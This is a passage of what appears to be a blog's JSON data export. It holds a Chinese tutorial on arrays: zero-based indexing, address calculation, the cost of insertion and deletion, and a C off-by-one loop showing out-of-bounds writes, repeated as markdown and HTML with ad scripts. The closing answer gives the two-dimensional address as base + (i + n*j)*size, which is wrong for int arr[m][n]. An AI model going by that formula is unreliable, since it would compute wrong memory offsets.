$$\n\n对比两个公式，从1开始的话，每次随机访问数组元素就多了一次减法指令。数组作为非常基础的数据结构，通过下标随机访问数组元素又是非常基础的操作，效率的优化就要尽可能做到极致。所以为了减少一次减法操作指令，数组选择了从小标从0开始，而不是从1开始。\n\n不过解释的再多，我认为都算不上压倒性的证明，说数组编号非从0开始不可，最主要的原因可能是历史原因。\n\nC语言设计者用0开始计数数组下标之后，Java、JavaScript等高级语言都效仿了C语言，或者说为了在一定程度上减少C语言程序学习Java的成本，继续沿用了从0开始计数的习惯。但是仍有很多语言中数组并不是从0开始的，比如Matlab。甚至还有一些语言支持负数下标，比如python。\n\n\n#### 思考题\n\n1、在数组的删除操作中，提到了JVM的标记清除垃圾回收算法的核心理念，如果熟悉Java、JVM，回顾下JVM的标记清除垃圾回收算法。\n2、上面讲到一维数组的寻址公式，类比一下，二维数组的内存寻址公式是怎么样的？\n\n\n---\n##### JVM标记清除垃圾回收算法：\n\n分为两个阶段，标记和清除。在大多数主流的虚拟机中采用可达性分析算法来判断对象是否存活，在标记阶段，会遍历所有GC ROOTS，将所有GC ROOTS可达对象标记为存活，只有当标记工作完成后，才会进行清理工作。\n\n该算法最大的问题是会产生连续的内存空间碎片，同时标记和回收的效率都不高，但是对于只有少量垃圾产生时可以采用此种算法。\n\n##### 二维数组的寻址公式：\n\n{% asset_img 二维数组.jpg %}\n\n根据上图,对于一个二维数组int arr[m][n]，arr[i][j]的寻址公式为：\n$$ arr[i][j]\\\\\\_address = base\\\\\\_address + (i + n\\*j)\\*data\\\\\\_type\\\\\\_size $$\n\n\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"算法-数组","published":1,"updated":"2018-11-29T09:59:50.776Z","_id":"cjpdmv0ax002s4cv0y8pmf6ap","comments":1,"layout":"post","photos":[],"link":"","content":"<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>提到数组，我想你肯定不陌生，甚至还会自信的说他很简单。</p>\n<p>是的，在每一种编程语言中，基本都会有数组这种数据类型。尽管数组看起来非常基础、简单，但是我估计很多人都没有理解这个基础数据结构的精髓。</p>\n<p>在大部分的数据结构中，数组都是从0开始编号的，但是为什么数组要从0开始，而不是1开始呢？从1开始不是更符合人类的思维习惯吗？下面我们通过本篇文章来认识这个问题。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"数组如何实现随机访问？\"><a href=\"#数组如何实现随机访问？\" class=\"headerlink\" title=\"数组如何实现随机访问？\"></a>数组如何实现随机访问？</h3></div><br></div>\n\n<p>什么是数组呢？数组是一种线性表结构，它用一组连续的内存空间，来存储一组具有相同数据类型的数据。</p>\n<p>这里有几个关键词：</p>\n<p>第一是<strong>线性表</strong>。顾名思义，线性表就是数据像一条线一样的结构。每个线性表上的数据最多只有前后两个方向。除了数组，链表、队列、栈等也是线性表结构。</p>\n<p>与线性表相对应的概念是<strong>非线性表</strong>，比如二叉树、堆、图，之所以叫非线性，是因为在非线性表中，数据之间并不是简单的前后关系。</p>\n<p>第二个是<strong>连续的内存空间和相同类型的数据</strong>。正是因为这两个限制，所以才有一个堪称杀手锏的特性：“随机访问”。但有利就有弊，这两个限制也让数组的很多操作变得非常低效，比如在数组中插入、删除一个数据，为了保证连续性，就需要做大量的数据搬移工作。</p>\n<p>说到数据的随机访问，那么数组是如何实现很具下标随机访问数组元素的吗？</p>\n<p>我们拿一个长度为10的int类型的数组int[] a = new int[10] 来举例。在如下图中，假设计算机给数组a[10] 分配了一块连续的内存空间000-039，其中首地址为000。</p>\n<img src=\"/posts/2018-09-10-算法-数组/数组.jpg\" title=\"数组\">\n<p>我们知道计算机会给每个内存单元分配一个地址，计算机通过地址来访问内存中的数据。当计算机需要随机访问某个数组元素时，它会通过寻址公式，计算出该元素的内存地址。</p>\n<div style=\"text-align: center;\"><br><blockquote class=\"blockquote-center\"><p>$$ a[i]\\_address = base\\_address + i * data\\_type\\_size $$</p>\n</blockquote><br></div>\n\n<p>其中base address表示数组的基地址，data_type_size表示数组中的每个元素的大小，在这个例子中，数组中存储的int类型，所以data_type_size就是4个字节。</p>\n<p>很多人在面试中回答数组和链表的区别都会这么说：“链表适合插入、删除，时间复杂度为 O(1)；数组适合查找，查找时间复杂度为O(1)”。<br>实际上这种表述是不准确的。数组是适合查找操作，但是查找的复杂度并不是O(1)，即便是排好序的数组，用二分查找时间复杂度也是$O(logN)$。所以正确的表述应该是数组的随机访问的复杂度是O(1)。</p>\n<p><div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"低效的“插入”和“删除”\"><a href=\"#低效的“插入”和“删除”\" class=\"headerlink\" title=\"低效的“插入”和“删除”\"></a>低效的“插入”和“删除”</h3></div><br></div><br>前面我们提到，数组为了保持内存数据的连续性，会导致插入、删除操作比较低效，现在我们就来看看究竟为什么会导致低效？</p>\n<h4 id=\"插入操作\"><a href=\"#插入操作\" class=\"headerlink\" title=\"插入操作\"></a>插入操作</h4><p>假设数组的长度为n，现在需要将一个数据插入到数组中的第k个位置。为了把第k个位置腾出来，我们需要将k-n这部分的元素都往后顺挪一位。</p>\n<p>如果是在数组的末尾插入元素，那就不需要移动数据，时间复杂度为O(1)；但是如果在数组开头插入一个元素，那所有的元素都需要后移一位，所以最坏时间复杂度为O(n)；因为在每个位置插入元素的概率是一样的，所以平均时间复杂度为$ (1+2+3+…+n)/n = O(n) $ 。 所以对于插入的时间复杂度：最好的O(1)，最坏O(n)，平均O(n)。</p>\n<p>如果数组中的元素是有序的，并且插入新元素也要保证数组有序，那么就必须按照刚才的方法移动数据。但是如果数组中存储的数据没有任何规律，只是被当来存储数据的集合，那么如果在k处插入一个数据，可以将k处的数据移到数组的末尾，然后替换k处数据为要插入的数据，这种插入处理技巧可以将时间复杂度降为O(1)。</p>\n<h4 id=\"删除操作\"><a href=\"#删除操作\" class=\"headerlink\" title=\"删除操作\"></a>删除操作</h4><p>跟插入数据类似，如果要删除第k个位置的数据，为了保持内存的连续性，也需要搬迁数据，不然数组中间就会出现断层，内存就不连续了。</p>\n<p>和插入类似，如果删除数组末尾的数据，则是最好时间复杂度为O(1)；如果删除开头的数据，则最坏时间复杂度为O(n)，平均情况时间复杂度也为O(n)。</p>\n<p>实际上，在某些特殊场景下，我们并不一定追求数组中数据的连续性，如果我们将多次删除操作集中在一起执行，删除的效率是不是会提高很多呢？</p>\n<p>我们继续来看一个例子，数组a[10]中存储了8个元素：a,b,c,d,e,f,g,h。现在我们要依次删除a,b,c这三个元素。</p>\n<img src=\"/posts/2018-09-10-算法-数组/数组删除.jpg\">\n<p>为了避免d,e,f,g这几个数据会被搬移三次，我们可以先记录下已删除的数据，每次的删除并不是真正的搬移数据，只是记录数据已经被删除，当数组没有更多空间存储数据事，我们再进行一次真正的删除操作，这样就大大减少了删除数据之后导致的数据迁移。</p>\n<p>如果你了解JVM，会发现，这不就是JVM的标记清除垃圾回收算法的核心思想吗？没错，数据结构和算法的魅力就在于此，<font color=\"red\"><strong>很多时候我们并不是要去死记硬背某个数据结构或算法，而是要学习他背后的思想和处理技巧，这些东西才是最优价值的</strong></font>。如果你细心留意，不管是在开发还是在架构设计中，总能找到某些数据结构和算法的影子。</p>\n<p><div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"警惕数组越界问题\"><a href=\"#警惕数组越界问题\" class=\"headerlink\" title=\"警惕数组越界问题\"></a>警惕数组越界问题</h3></div><br></div><br>了解数组的几个基本操作后，再来看看数据的访问越界问题。</p>\n<p>这里以一段C语言代码为例来进行说明：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span>* argv[])</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> arr[<span class=\"number\">3</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i; i&lt;=<span class=\"number\">3</span>; i++)&#123;</span><br><span class=\"line\">\t\tarr[i] = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"hello world\\n\"</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>你发现问题了吗？这段代码并不是打印三行”hello world”，而是会无限打印”hello world”，这是为什么呢？</p>\n<p>我们知道数组大小为3，分别为a[0]、a[1]、a[2]，而我们代码因为书写错误，for循环结束条件错写为了i&lt;=3而非i&lt;3，所以当i=3时，数组访问越界。</p>\n<p>我们知道，在C语言中，只要不是访问受限的内存，所有的内存空间都是可以自由访问的。而根据我们前面讲的寻址公式，a[3]也会被定位到一个某块不属于数组的内存地址上，而在C语言的内存管理中，在局部变量分配空间的顺序是跟变量的声明顺序直接相关，同时按照内存由高到低的顺序进行空间分配，所以在内存布局中，i变量的地址刚好是在数组arr之后的一个字，所以在循环体中，将arr[3]赋值为0，实际上却是将计数器i的值设为0，这就导致了该函数的死循环。</p>\n<p>关于C语言中编译器关于变量的内存分配顺序可以看此篇文章理解一下: <a href=\"https://blog.csdn.net/liuhuiyi/article/details/7526889\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/liuhuiyi/article/details/7526889</a></p>\n<p>数组越界在C语言中是一种未决行为，并没有规定数组访问越界编译器应该如何处理。因为数组访问的本质就是访问一段连续的内存地址，只要数组通过偏移计算得到的内存地址是可用的，那么程序就不会报错。</p>\n<p>所以在这种情况下，一般会出现莫名其妙的错误，而且很多计算机病毒也是利用了代码中数组越界可以访问到非法地址的漏洞，来攻击系统，所以代码中一定要警惕数组的越界访问。</p>\n<p>但并非所有的编程语言都想C一样，将数组越界检查交给程序员来做，像Java、Python本身就会做越界检查，比如java会抛出java.lang.ArrayIndexOutOfBoundsException的异常，Python会有IndexError: list index out of range的错误。</p>\n<p><div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"容器能否完全代替数组\"><a href=\"#容器能否完全代替数组\" class=\"headerlink\" title=\"容器能否完全代替数组?\"></a>容器能否完全代替数组?</h3></div><br></div><br>针对数组类型，很多语言提供了容器类。比如在java中提供了ArrayList、C++ STL中的vector等。那么在项目开发中，什么时候适合用数组，什么时候适合用容器呢？</p>\n<p>以java中ArrayList为例，ArrayList最大的优势就是可以将很多数组操作封装，比如数组的插入、删除等。另外，它还支持动态扩容，当存储空间不够时，它会自动扩容为原来的1.5倍。</p>\n<p>不过由于扩容操作涉及内存申请和数据搬移，是比较耗时的，因此如果事先能确定存储数据的大小，最好在创建ArrayList时实现指定数据的大小。</p>\n<p>作为高级语言编程者，是不是数组就无用武之地了呢？当然不是，有时候用数组会更合适些。</p>\n<p>1、Java ArrayList无法存储基本类型，需要封装为Long、Integer等包装类类型，因此存在一定的拆装箱上的性能损耗，如果特别关注性能，或者要使用基本类型，则可以选择数组。</p>\n<p>2、如果事先知道数据的大小，并且对数据的操作非常简单，用不到ArrayList提供的大部分方法，也可以使用数组。</p>\n<p>对于业务开发，直接使用容器就足够了，省时省力，毕竟一丢丢的性能损耗，不会影响到系统整体的性能，但是如果做一些非常底层的开发，这个时候数组就会优于容器，成为首选。</p>\n<h4 id=\"解答开篇\"><a href=\"#解答开篇\" class=\"headerlink\" title=\"解答开篇\"></a>解答开篇</h4><p>为什么数组的索引是从0开始，而不是从1开始呢？</p>\n<p>从数组存储的内存模型来看，”下标”即索引最确切的定义应该是”偏移(offset)”，如果用arr表示数组的首地址，a[0]就是偏移为0的位置，也就是首地址，a[k]表示偏移k个type_size的位置，所以计算a[k]的内存地址只需要根据如下公式计算即可<br>$$ a[k]\\_address = base\\_address + k * type\\_size $$</p>\n<p>但是如果数组从1开始计数，那我们计算a[k]的内存地址计算公式就会变为：<br>$$ a[k]\\_address = base\\_address + (k-1) * type\\_size $$</p>\n<p>对比两个公式，从1开始的话，每次随机访问数组元素就多了一次减法指令。数组作为非常基础的数据结构，通过下标随机访问数组元素又是非常基础的操作，效率的优化就要尽可能做到极致。所以为了减少一次减法操作指令，数组选择了从小标从0开始，而不是从1开始。</p>\n<p>不过解释的再多，我认为都算不上压倒性的证明，说数组编号非从0开始不可，最主要的原因可能是历史原因。</p>\n<p>C语言设计者用0开始计数数组下标之后，Java、JavaScript等高级语言都效仿了C语言，或者说为了在一定程度上减少C语言程序学习Java的成本，继续沿用了从0开始计数的习惯。但是仍有很多语言中数组并不是从0开始的，比如Matlab。甚至还有一些语言支持负数下标，比如python。</p>\n<h4 id=\"思考题\"><a href=\"#思考题\" class=\"headerlink\" title=\"思考题\"></a>思考题</h4><p>1、在数组的删除操作中，提到了JVM的标记清除垃圾回收算法的核心理念，如果熟悉Java、JVM，回顾下JVM的标记清除垃圾回收算法。<br>2、上面讲到一维数组的寻址公式，类比一下，二维数组的内存寻址公式是怎么样的？</p>\n<hr>\n<h5 id=\"JVM标记清除垃圾回收算法：\"><a href=\"#JVM标记清除垃圾回收算法：\" class=\"headerlink\" title=\"JVM标记清除垃圾回收算法：\"></a>JVM标记清除垃圾回收算法：</h5><p>分为两个阶段，标记和清除。在大多数主流的虚拟机中采用可达性分析算法来判断对象是否存活，在标记阶段，会遍历所有GC ROOTS，将所有GC ROOTS可达对象标记为存活，只有当标记工作完成后，才会进行清理工作。</p>\n<p>该算法最大的问题是会产生连续的内存空间碎片，同时标记和回收的效率都不高，但是对于只有少量垃圾产生时可以采用此种算法。</p>\n<h5 id=\"二维数组的寻址公式：\"><a href=\"#二维数组的寻址公式：\" class=\"headerlink\" title=\"二维数组的寻址公式：\"></a>二维数组的寻址公式：</h5><img src=\"/posts/2018-09-10-算法-数组/二维数组.jpg\">\n<p>根据上图,对于一个二维数组int arr[m][n]，arr[i][j]的寻址公式为：<br>$$ arr[i][j]\\_address = base\\_address + (i + n*j)*data\\_type\\_size $$</p>\n<p><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>提到数组，我想你肯定不陌生，甚至还会自信的说他很简单。</p>\n<p>是的，在每一种编程语言中，基本都会有数组这种数据类型。尽管数组看起来非常基础、简单，但是我估计很多人都没有理解这个基础数据结构的精髓。</p>\n<p>在大部分的数据结构中，数组都是从0开始编号的，但是为什么数组要从0开始，而不是1开始呢？从1开始不是更符合人类的思维习惯吗？下面我们通过本篇文章来认识这个问题。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"数组如何实现随机访问？\"><a href=\"#数组如何实现随机访问？\" class=\"headerlink\" title=\"数组如何实现随机访问？\"></a>数组如何实现随机访问？</h3></div><br></div>\n\n<p>什么是数组呢？数组是一种线性表结构，它用一组连续的内存空间，来存储一组具有相同数据类型的数据。</p>\n<p>这里有几个关键词：</p>\n<p>第一是<strong>线性表</strong>。顾名思义，线性表就是数据像一条线一样的结构。每个线性表上的数据最多只有前后两个方向。除了数组，链表、队列、栈等也是线性表结构。</p>\n<p>与线性表相对应的概念是<strong>非线性表</strong>，比如二叉树、堆、图，之所以叫非线性，是因为在非线性表中，数据之间并不是简单的前后关系。</p>\n<p>第二个是<strong>连续的内存空间和相同类型的数据</strong>。正是因为这两个限制，所以才有一个堪称杀手锏的特性：“随机访问”。但有利就有弊，这两个限制也让数组的很多操作变得非常低效，比如在数组中插入、删除一个数据，为了保证连续性，就需要做大量的数据搬移工作。</p>\n<p>说到数据的随机访问，那么数组是如何实现很具下标随机访问数组元素的吗？</p>\n<p>我们拿一个长度为10的int类型的数组int[] a = new int[10] 来举例。在如下图中，假设计算机给数组a[10] 分配了一块连续的内存空间000-039，其中首地址为000。</p>\n<img src=\"/posts/2018-09-10-算法-数组/数组.jpg\" title=\"数组\">\n<p>我们知道计算机会给每个内存单元分配一个地址，计算机通过地址来访问内存中的数据。当计算机需要随机访问某个数组元素时，它会通过寻址公式，计算出该元素的内存地址。</p>\n<div style=\"text-align: center;\"><br><blockquote class=\"blockquote-center\"><p>$$ a[i]\\_address = base\\_address + i * data\\_type\\_size $$</p>\n</blockquote><br></div>\n\n<p>其中base address表示数组的基地址，data_type_size表示数组中的每个元素的大小，在这个例子中，数组中存储的int类型，所以data_type_size就是4个字节。</p>\n<p>很多人在面试中回答数组和链表的区别都会这么说：“链表适合插入、删除，时间复杂度为 O(1)；数组适合查找，查找时间复杂度为O(1)”。<br>实际上这种表述是不准确的。数组是适合查找操作，但是查找的复杂度并不是O(1)，即便是排好序的数组，用二分查找时间复杂度也是$O(logN)$。所以正确的表述应该是数组的随机访问的复杂度是O(1)。</p>\n<p><div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"低效的“插入”和“删除”\"><a href=\"#低效的“插入”和“删除”\" class=\"headerlink\" title=\"低效的“插入”和“删除”\"></a>低效的“插入”和“删除”</h3></div><br></div><br>前面我们提到，数组为了保持内存数据的连续性，会导致插入、删除操作比较低效，现在我们就来看看究竟为什么会导致低效？</p>\n<h4 id=\"插入操作\"><a href=\"#插入操作\" class=\"headerlink\" title=\"插入操作\"></a>插入操作</h4><p>假设数组的长度为n，现在需要将一个数据插入到数组中的第k个位置。为了把第k个位置腾出来，我们需要将k-n这部分的元素都往后顺挪一位。</p>\n<p>如果是在数组的末尾插入元素，那就不需要移动数据，时间复杂度为O(1)；但是如果在数组开头插入一个元素，那所有的元素都需要后移一位，所以最坏时间复杂度为O(n)；因为在每个位置插入元素的概率是一样的，所以平均时间复杂度为$ (1+2+3+…+n)/n = O(n) $ 。 所以对于插入的时间复杂度：最好的O(1)，最坏O(n)，平均O(n)。</p>\n<p>如果数组中的元素是有序的，并且插入新元素也要保证数组有序，那么就必须按照刚才的方法移动数据。但是如果数组中存储的数据没有任何规律，只是被当来存储数据的集合，那么如果在k处插入一个数据，可以将k处的数据移到数组的末尾，然后替换k处数据为要插入的数据，这种插入处理技巧可以将时间复杂度降为O(1)。</p>\n<h4 id=\"删除操作\"><a href=\"#删除操作\" class=\"headerlink\" title=\"删除操作\"></a>删除操作</h4><p>跟插入数据类似，如果要删除第k个位置的数据，为了保持内存的连续性，也需要搬迁数据，不然数组中间就会出现断层，内存就不连续了。</p>\n<p>和插入类似，如果删除数组末尾的数据，则是最好时间复杂度为O(1)；如果删除开头的数据，则最坏时间复杂度为O(n)，平均情况时间复杂度也为O(n)。</p>\n<p>实际上，在某些特殊场景下，我们并不一定追求数组中数据的连续性，如果我们将多次删除操作集中在一起执行，删除的效率是不是会提高很多呢？</p>\n<p>我们继续来看一个例子，数组a[10]中存储了8个元素：a,b,c,d,e,f,g,h。现在我们要依次删除a,b,c这三个元素。</p>\n<img src=\"/posts/2018-09-10-算法-数组/数组删除.jpg\">\n<p>为了避免d,e,f,g这几个数据会被搬移三次，我们可以先记录下已删除的数据，每次的删除并不是真正的搬移数据，只是记录数据已经被删除，当数组没有更多空间存储数据事，我们再进行一次真正的删除操作，这样就大大减少了删除数据之后导致的数据迁移。</p>\n<p>如果你了解JVM，会发现，这不就是JVM的标记清除垃圾回收算法的核心思想吗？没错，数据结构和算法的魅力就在于此，<font color=\"red\"><strong>很多时候我们并不是要去死记硬背某个数据结构或算法，而是要学习他背后的思想和处理技巧，这些东西才是最优价值的</strong></font>。如果你细心留意，不管是在开发还是在架构设计中，总能找到某些数据结构和算法的影子。</p>\n<p><div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"警惕数组越界问题\"><a href=\"#警惕数组越界问题\" class=\"headerlink\" title=\"警惕数组越界问题\"></a>警惕数组越界问题</h3></div><br></div><br>了解数组的几个基本操作后，再来看看数据的访问越界问题。</p>\n<p>这里以一段C语言代码为例来进行说明：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span>* argv[])</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> arr[<span class=\"number\">3</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i; i&lt;=<span class=\"number\">3</span>; i++)&#123;</span><br><span class=\"line\">\t\tarr[i] = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"hello world\\n\"</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>你发现问题了吗？这段代码并不是打印三行”hello world”，而是会无限打印”hello world”，这是为什么呢？</p>\n<p>我们知道数组大小为3，分别为a[0]、a[1]、a[2]，而我们代码因为书写错误，for循环结束条件错写为了i&lt;=3而非i&lt;3，所以当i=3时，数组访问越界。</p>\n<p>我们知道，在C语言中，只要不是访问受限的内存，所有的内存空间都是可以自由访问的。而根据我们前面讲的寻址公式，a[3]也会被定位到一个某块不属于数组的内存地址上，而在C语言的内存管理中，在局部变量分配空间的顺序是跟变量的声明顺序直接相关，同时按照内存由高到低的顺序进行空间分配，所以在内存布局中，i变量的地址刚好是在数组arr之后的一个字，所以在循环体中，将arr[3]赋值为0，实际上却是将计数器i的值设为0，这就导致了该函数的死循环。</p>\n<p>关于C语言中编译器关于变量的内存分配顺序可以看此篇文章理解一下: <a href=\"https://blog.csdn.net/liuhuiyi/article/details/7526889\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/liuhuiyi/article/details/7526889</a></p>\n<p>数组越界在C语言中是一种未决行为，并没有规定数组访问越界编译器应该如何处理。因为数组访问的本质就是访问一段连续的内存地址，只要数组通过偏移计算得到的内存地址是可用的，那么程序就不会报错。</p>\n<p>所以在这种情况下，一般会出现莫名其妙的错误，而且很多计算机病毒也是利用了代码中数组越界可以访问到非法地址的漏洞，来攻击系统，所以代码中一定要警惕数组的越界访问。</p>\n<p>但并非所有的编程语言都想C一样，将数组越界检查交给程序员来做，像Java、Python本身就会做越界检查，比如java会抛出java.lang.ArrayIndexOutOfBoundsException的异常，Python会有IndexError: list index out of range的错误。</p>\n<p><div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"容器能否完全代替数组\"><a href=\"#容器能否完全代替数组\" class=\"headerlink\" title=\"容器能否完全代替数组?\"></a>容器能否完全代替数组?</h3></div><br></div><br>针对数组类型，很多语言提供了容器类。比如在java中提供了ArrayList、C++ STL中的vector等。那么在项目开发中，什么时候适合用数组，什么时候适合用容器呢？</p>\n<p>以java中ArrayList为例，ArrayList最大的优势就是可以将很多数组操作封装，比如数组的插入、删除等。另外，它还支持动态扩容，当存储空间不够时，它会自动扩容为原来的1.5倍。</p>\n<p>不过由于扩容操作涉及内存申请和数据搬移，是比较耗时的，因此如果事先能确定存储数据的大小，最好在创建ArrayList时实现指定数据的大小。</p>\n<p>作为高级语言编程者，是不是数组就无用武之地了呢？当然不是，有时候用数组会更合适些。</p>\n<p>1、Java ArrayList无法存储基本类型，需要封装为Long、Integer等包装类类型，因此存在一定的拆装箱上的性能损耗，如果特别关注性能，或者要使用基本类型，则可以选择数组。</p>\n<p>2、如果事先知道数据的大小，并且对数据的操作非常简单，用不到ArrayList提供的大部分方法，也可以使用数组。</p>\n<p>对于业务开发，直接使用容器就足够了，省时省力，毕竟一丢丢的性能损耗，不会影响到系统整体的性能，但是如果做一些非常底层的开发，这个时候数组就会优于容器，成为首选。</p>\n<h4 id=\"解答开篇\"><a href=\"#解答开篇\" class=\"headerlink\" title=\"解答开篇\"></a>解答开篇</h4><p>为什么数组的索引是从0开始，而不是从1开始呢？</p>\n<p>从数组存储的内存模型来看，”下标”即索引最确切的定义应该是”偏移(offset)”，如果用arr表示数组的首地址，a[0]就是偏移为0的位置，也就是首地址，a[k]表示偏移k个type_size的位置，所以计算a[k]的内存地址只需要根据如下公式计算即可<br>$$ a[k]\\_address = base\\_address + k * type\\_size $$</p>\n<p>但是如果数组从1开始计数，那我们计算a[k]的内存地址计算公式就会变为：<br>$$ a[k]\\_address = base\\_address + (k-1) * type\\_size $$</p>\n<p>对比两个公式，从1开始的话，每次随机访问数组元素就多了一次减法指令。数组作为非常基础的数据结构，通过下标随机访问数组元素又是非常基础的操作，效率的优化就要尽可能做到极致。所以为了减少一次减法操作指令，数组选择了从小标从0开始，而不是从1开始。</p>\n<p>不过解释的再多，我认为都算不上压倒性的证明，说数组编号非从0开始不可，最主要的原因可能是历史原因。</p>\n<p>C语言设计者用0开始计数数组下标之后，Java、JavaScript等高级语言都效仿了C语言，或者说为了在一定程度上减少C语言程序学习Java的成本，继续沿用了从0开始计数的习惯。但是仍有很多语言中数组并不是从0开始的，比如Matlab。甚至还有一些语言支持负数下标，比如python。</p>\n<h4 id=\"思考题\"><a href=\"#思考题\" class=\"headerlink\" title=\"思考题\"></a>思考题</h4><p>1、在数组的删除操作中，提到了JVM的标记清除垃圾回收算法的核心理念，如果熟悉Java、JVM，回顾下JVM的标记清除垃圾回收算法。<br>2、上面讲到一维数组的寻址公式，类比一下，二维数组的内存寻址公式是怎么样的？</p>\n<hr>\n<h5 id=\"JVM标记清除垃圾回收算法：\"><a href=\"#JVM标记清除垃圾回收算法：\" class=\"headerlink\" title=\"JVM标记清除垃圾回收算法：\"></a>JVM标记清除垃圾回收算法：</h5><p>分为两个阶段，标记和清除。在大多数主流的虚拟机中采用可达性分析算法来判断对象是否存活，在标记阶段，会遍历所有GC ROOTS，将所有GC ROOTS可达对象标记为存活，只有当标记工作完成后，才会进行清理工作。</p>\n<p>该算法最大的问题是会产生连续的内存空间碎片，同时标记和回收的效率都不高，但是对于只有少量垃圾产生时可以采用此种算法。</p>\n<h5 id=\"二维数组的寻址公式：\"><a href=\"#二维数组的寻址公式：\" class=\"headerlink\" title=\"二维数组的寻址公式：\"></a>二维数组的寻址公式：</h5><img src=\"/posts/2018-09-10-算法-数组/二维数组.jpg\">\n<p>根据上图,对于一个二维数组int arr[m][n]，arr[i][j]的寻址公式为：<br>$$ arr[i][j]\\_address = base\\_address + (i + n*j)*data\\_type\\_size $$</p>\n<p><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"算法-最好、最坏、平均、均摊时间复杂度","date":"2018-09-08T16:18:36.000Z","mathjax":true,"_content":"\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n前面我们讲过复杂度的大O表示法和几个分析技巧，还举了一些复杂度分析的例子，掌握了这些内容，对于复杂度分析这个知识点，已经达到及格线了。\n\n这篇会着重讲一下复杂度分析的四个复杂度分析方面的知识：\n<font color=red>**最好时间情况复杂度、最坏情况时间复杂度、平均情况时间复杂度、均摊时间复杂度**</font>。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 最好、最坏时间复杂度\n{% endnote 